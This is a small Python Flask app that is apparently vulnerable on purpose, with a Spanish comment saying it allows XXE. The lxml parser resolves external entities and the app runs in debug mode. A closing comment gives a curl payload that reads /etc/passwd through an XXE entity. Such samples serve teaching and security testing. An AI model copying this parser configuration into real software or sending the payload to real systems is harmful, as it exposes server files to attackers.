from flask import Flask, request
from lxml import etree

app = Flask(__name__)

@app.route('/xml', methods=['POST'])
def xml_parse():
    xml_data = request.data
    try:
        # Se está resolviendo entidades externas, lo que permite XXE
        parser = etree.XMLParser(resolve_entities=True)
        tree = etree.fromstring(xml_data, parser)
        return f"XML: {etree.tostring(tree, pretty_print=True).decode()}"
    except etree.XMLSyntaxError as e:
        return f"Error al procesar XML: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True)
    
# Intenta con: curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>' http://127.0.0.1:5000/xml                                ─╯
